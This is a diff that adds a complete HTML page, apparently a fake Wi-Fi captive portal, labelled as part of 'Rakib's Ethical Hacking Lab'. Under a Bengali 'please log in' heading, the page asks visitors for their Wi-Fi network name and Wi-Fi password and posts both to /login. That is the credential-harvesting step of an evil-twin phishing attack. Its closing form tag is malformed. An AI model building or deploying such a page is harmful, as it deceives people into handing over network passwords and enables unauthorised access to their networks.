@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login - Rakib's Project</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        body { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); height: 100vh; display: flex; justify-content: center; align-items: center; }
+        .login-card { background: white; padding: 40px; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.2); width: 350px; text-align: center; }
+        h2 { color: #333; margin-bottom: 25px; }
+        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; outline: none; }
+        input:focus { border-color: #764ba2; }
+        button { width: 100%; padding: 12px; background: #764ba2; border: none; color: white; border-radius: 8px; cursor: pointer; font-size: 16px; transition: 0.3s; }
+        button:hover { background: #667eea; }
+        .footer { margin-top: 20px; font-size: 12px; color: #777; }
+    </style>
+</head>
+<body>
+
+<div class="login-card">
+    <h2>লগইন করুন</h2>
+    <form action="/login" method="POST">
+        <input type="text" name="email" placeholder="WIFI এর নাম" required>
+        <input type="password" name="password" placeholder="WIFI পাসওয়ার্ড" required>
+        <button type="submit">Login</button>
+    </form ‍
+    <div class="footer">
+        © 2026 Rakib's Ethical Hacking Lab
+    </div>
+</div>
+
+</body>
+</html>
